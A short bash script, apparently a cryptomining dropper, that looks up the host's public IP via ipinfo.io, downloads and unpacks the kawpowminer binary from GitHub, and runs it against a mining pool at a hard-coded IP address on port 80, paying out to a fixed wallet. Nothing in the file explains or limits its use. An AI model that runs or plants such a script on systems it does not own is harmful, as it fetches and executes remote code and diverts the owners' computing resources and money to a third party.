#!bin/bash -xe 
curl ipinfo.io
wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu16-1.2.3.zip
unzip kawpowminer-ubuntu16-1.2.3.zip
ls -la
chmod +x kawpowminer
ls -la kawpowminer
./kawpowminer -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80
